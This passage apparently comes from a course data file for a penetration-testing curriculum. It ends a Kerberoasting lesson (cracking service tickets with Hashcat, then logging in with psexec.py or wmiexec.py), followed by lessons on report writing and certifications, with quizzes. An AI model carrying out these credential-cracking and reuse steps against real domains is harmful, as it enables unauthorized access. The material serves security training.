2. Verify the saved \`$krb5tgs$\` ticket in \`kerberoast_hashes.txt\`.
3. Execute Hashcat mode 13100 to crack the service account password.
4. Use the cracked credentials to authenticate via \`psexec.py\` or \`wmiexec.py\`.

## Common Mistakes
- Targeting accounts that use AES-256 Kerberos encryption without ensuring wordlists match complex enterprise passwords.
- Forgetting to synchronize time between the attacker machine and the Domain Controller (Kerberos rejects tickets if clock skew exceeds 5 minutes).

## Defensive Perspective
Migrate legacy service accounts to **Group Managed Service Accounts (gMSA)**, which feature automatically generated 128-character passwords cycled every 30 days. For standard service accounts, mandate 25+ character passphrases.

## Homework
1. Set up a Windows Server evaluation lab in VirtualBox.
2. Create an SPN and perform Kerberoasting and AS-REP Roasting against it.`,
    quiz: [
      {
        question: "Why can any regular domain user request Kerberos tickets for any SPN in Active Directory?",
        options: ["Because Active Directory is open source", "By design, clients must request TGS tickets from the KDC to authenticate to network services", "Because Kerberos encryption is obsolete", "Due to a bug in Windows 11"],
        answer: 1,
        explanation: "Kerberos protocol architecture allows any valid domain user to request a ticket for any service so client applications can authenticate."
      },
      {
        question: "Which Hashcat mode (-m) is used to crack Kerberoast TGS-REP tickets?",
        options: ["0", "1000", "13100", "22000"],
        answer: 2,
        explanation: "Hashcat mode 13100 specifically cracks Kerberos 5 TGS-REP etype 23 hashes."
      },
      {
        question: "What modern Active Directory feature neutralizes Kerberoasting by automatically rotating 128-character passwords?",
        options: ["Group Managed Service Accounts (gMSA)", "Windows Defender Firewall", "BitLocker", "DNSSEC"],
        answer: 0,
        explanation: "gMSAs use randomized 128-character passwords that are managed and cycled automatically by the domain controller."
      },
      {
        question: "What tool uses graph theory to visualize attack paths to Domain Admin in Active Directory?",
        options: ["Wireshark", "BloodHound", "John the Ripper", "Nikto"],
        answer: 1,
        explanation: "BloodHound maps enterprise relationship graphs to reveal shortest paths to Domain Admin."
      },
      {
        question: "What is the maximum allowable Kerberos clock skew before authentication requests fail?",
        options: ["1 second", "5 minutes", "24 hours", "Unlimited"],
        answer: 1,
        explanation: "Standard Kerberos protocol limits clock skew between client and KDC to 5 minutes to prevent replay attacks."
      }
    ]
  },

  // PART 4: PROFESSIONAL (PRO GATED)
  {
    slug: "professional-report-writing",
    title: "Professional Reporting: Executive Summaries & Technical PoCs",
    module: "Module 21: Professional Reporting",
    part: 4,
    partTitle: "Part 4: Professional",
    order: 21,
    durationMinutes: 45,
    video_url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
    lab_image: null,
    is_pro: true,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Clients do not pay $15,000 to $35,000 for you to run exploits in a terminal; they pay for the **written report**. A world-class vulnerability finding with reproducible proofs-of-concept, accurate CVSS 3.1 scoring, and actionable engineering remediation enables organizations to secure their assets. A sloppy, scanner-generated PDF ruins your professional reputation and exposes your consultancy to legal liabilities.

## Theory
A commercial penetration testing report serves two completely different audiences:
1. **The Executive Audience (CEO, Board of Directors, Legal Counsel):**
   - Requires an Executive Summary free of technical terminal jargon.
   - Translates technical vulnerabilities into **business risk, financial exposure, and regulatory non-compliance (GDPR, PCI-DSS, SOC 2)**.
   - Visualizes overall security posture with high-level charts.
2. **The Technical Audience (Software Engineers, DevOps, System Administrators):**
   - Demands exact, step-by-step reproduction instructions.
   - Clean, redacted screenshot evidence.
   - Concrete remediation code snippets rather than generic advice like 'sanitize user input'.

## The Anatomy of an Enterprise Vulnerability Finding
Every finding must follow the standard 6-component structure:
1. **Title & Severity:** Clear naming with CVSS 3.1 Base Score and Vector String.
2. **Vulnerability Overview:** What the flaw is in plain English.
3. **Business Impact:** What an attacker achieves (e.g. database compromise, lateral movement).
4. **Proof of Concept (PoC):** Numbered, step-by-step reproduction instructions with requests and responses.
5. **Remediation Guidance:** Specific developer and system administrator patches.
6. **References:** Relevant CWE IDs, OWASP references, and CVE identifiers.

## Tool Walkthrough with Real Runnable Commands

### 1. Generating CVSS 3.1 Vector String
\`\`\`text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Score: 9.8 Critical)
\`\`\`

### 2. Auditing Markdown Findings
\`\`\`bash
cat << 'EOF' > finding_sample.md
### [CRITICAL] Remote Code Execution via Insecure File Upload
- **Affected Asset:** https://app.client.com/profile/upload
- **CVSS 3.1:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Status:** Verified Unpatched
EOF
\`\`\`

## Step-by-Step Lab
1. In your lab terminal, craft a formal finding entry for one vulnerability identified in previous modules.
2. Calculate the CVSS 3.1 Base Score using standard metrics.
3. Validate that your reproduction steps can be followed without external guidance.

## Common Mistakes
- Including unredacted customer PII, credit card numbers, or passwords in report screenshots.
- Providing vague remediation advice like 'implement robust security practices'.
- Delivering raw automated scanner exports (e.g. Nessus CSV) as the final client deliverable.

## Defensive Perspective
Organizations must establish a structured Vulnerability Management policy that assigns strict Service Level Agreements (SLAs) to findings: Critical (remediated within 48 hours), High (remediated within 14 days), Medium (30 days).

## Homework
1. Review the sample Rules of Engagement (ROE) document in Appendix D.
2. Draft a complete 2-page mock penetration testing report based on an exploited lab target.`,
    quiz: [
      {
        question: "Who is the primary target audience for the Executive Summary section of a penetration testing report?",
        options: ["Junior developers looking for source code patches", "C-suite executives, legal counsel, and board members who evaluate business risk", "Automated SIEM parsers", "External threat actors"],
        answer: 1,
        explanation: "The Executive Summary translates technical findings into executive business risks and governance impact."
      },
      {
        question: "Why must sensitive customer data (such as passwords or personal identification) be redacted from report screenshots?",
        options: ["To reduce PDF file size", "To comply with privacy laws (GDPR/HIPAA) and prevent the report itself from becoming a data leak risk", "Because screenshots cannot display numbers", "It is prohibited by Adobe"],
        answer: 1,
        explanation: "Penetration testing reports are stored across multiple business units; exposing unredacted PII creates severe regulatory liabilities."
      },
      {
        question: "Which CVSS 3.1 severity rating corresponds to a score of 9.8?",
        options: ["Low", "Medium", "High", "Critical"],
        answer: 3,
        explanation: "CVSS scores from 9.0 to 10.0 are classified as Critical."
      },
      {
        question: "What makes a Proof of Concept (PoC) high quality?",
        options: ["It is over 50 pages long", "It contains clear, numbered, reproducible steps that allow a developer to recreate the issue within minutes", "It requires proprietary third-party commercial tools to verify", "It includes animated GIFs"],
        answer: 1,
        explanation: "A high-quality PoC provides unambiguous, step-by-step instructions so remediation teams can confirm the flaw and retest the patch."
      },
      {
        question: "What is an Attestation of Assessment?",
        options: ["A legal subpoena", "A formal letter from the testing consultancy certifying that an independent security audit was performed on specified dates", "A bill of sale for software", "An insurance policy"],
        answer: 1,
        explanation: "An Attestation Letter summarizes the testing engagement dates and scope for third-party compliance audits (e.g., SOC 2, ISO 27001)."
      }
    ]
  },
  {
    slug: "certifications-roadmap-2026",
    title: "Certifications Roadmap: eJPT → PNPT → OSCP → CRTP",
    module: "Module 22: Certifications Roadmap",
    part: 4,
    partTitle: "Part 4: Professional",
    order: 22,
    durationMinutes: 40,
    video_url: "https://www.youtube.com/watch?v=Z78VUA9xK3c",
    lab_image: null,
    is_pro: true,
    content_md: `> ⚠️ Authorized training environment only — never test systems you don't own or have written permission to test.

## Why It Matters
Certifications pass corporate HR filters and validate your hands-on methodology. However, spending thousands on multiple-choice trivia tests (e.g. CEH) yields poor ROI compared to 24-hour practical lab exams (OSCP, PNPT).

## Theory
The 2026 offensive security certification hierarchy:
1. **eJPTv2 (INE Security):** 48-hour hands-on practical exam. Perfect entry benchmark.
2. **PNPT (TCM Security):** 5-day penetration test + 15-minute live assessor debrief. High industry respect.
3. **OSCP (Offensive Security):** The gold standard 24-hour hands-on exam + 24-hour report.
4. **CRTP (Altered Security):** Active Directory focused hands-on exam.

## Tool Walkthrough with Real Runnable Commands

### 1. Tracking Practice Machine Count
\`\`\`bash
echo "Target Milestone: 40 Proving Grounds Practice + 20 Active HTB Boxes"
\`\`\`

## Step-by-Step Lab
1. Build your 120-day certification study calendar.
2. Allocate 15 hours per week to hands-on vulnerable machine labs.

## Common Mistakes
- Paying for exam vouchers before completing at least 30 independent CTF machines.

## Defensive Perspective
Certifications ensure security engineers understand both attack vectors and remediation strategies.

## Homework
1. Review the TJnull OSCP preparation list on Proving Grounds Practice.`,
    quiz: [
      {
        question: "Which certification is widely regarded as the corporate benchmark for hands-on penetration testing?",
        options: ["CompTIA A+", "OSCP", "CEH Multiple Choice", "AWS Cloud Practitioner"],
        answer: 1,
        explanation: "The OSCP 24-hour practical exam is the corporate gold standard."
      },
      {
        question: "What unique component does the PNPT certification include?",
        options: ["A 15-minute live video debrief with an assessor", "A 100-question multiple choice test", "A physical break-in test", "A math test"],
        answer: 0,
        explanation: "PNPT requires a live debrief presentation to simulate client executive reporting."
      },
      {
        question: "Which certification specializes exclusively in Active Directory attacks and defenses?",
        options: ["CRTP", "Network+", "Security+", "ITIL"],
        answer: 0,
        explanation: "Certified Red Team Professional (CRTP) focuses on Active Directory."
      },
      {
        question: "How long is the practical exam window for the OSCP?",
        options: ["2 hours", "24 hours", "30 days", "48 hours"],
        answer: 1,
        explanation: "OSCP allocates 23 hours and 45 minutes for the hands-on lab plus 24 hours for reporting."
      },
      {
        question: "What is the recommended number of independent practice CTF machines to solve before booking an OSCP exam?",
        options: ["1 to 2", "10", "40 to 60+", "1000"],
        answer: 2,
        explanation: "40 to 60+ machines across Proving Grounds and HTB ensures reliable methodology and muscle memory."
      }
    ]
  }
];

export const CURRICULUM_MODULES: ModuleGroup[] = [
  {
    id: "part-1",
    partNumber: 1,
    partTitle: "Part 1: Foundations",
    title: "Foundations & Lab Architecture",
    description: "Core virtualization, Linux internals, network protocols, and hacking mindset.",
    weeksSpan: "Weeks 1–4",
    is_pro: false,
    lessons: HACKFORGE_CURRICULUM.filter((l) => l.part === 1)
  },
  {
    id: "part-2",
    partNumber: 2,
    partTitle: "Part 2: Core Hacking Skills",
    title: "Core Offensive Security",
    description: "Nmap scanning, vulnerability analysis, password attacks, and OWASP web exploitation.",
    weeksSpan: "Weeks 5–12",
    is_pro: false,
    lessons: HACKFORGE_CURRICULUM.filter((l) => l.part === 2)
  },
  {
    id: "part-3",
    partNumber: 3,
    partTitle: "Part 3: Advanced Offensive Security",
    title: "Advanced Exploitation & Active Directory",
    description: "Linux/Windows privesc, Kerberoasting, BloodHound, pivoting, and AV evasion.",
    weeksSpan: "Weeks 13–20",
    is_pro: true,
    lessons: HACKFORGE_CURRICULUM.filter((l) => l.part === 3)
  },
  {
    id: "part-4",
    partNumber: 4,
    partTitle: "Part 4: Professional",
    title: "Enterprise Delivery & Career",
    description: "Executive reporting, certification roadmap (eJPT→PNPT→OSCP), and freelance client contracts.",
    weeksSpan: "Weeks 21–26",
    is_pro: true,
    lessons: HACKFORGE_CURRICULUM.filter((l) => l.part === 4)
  }
];
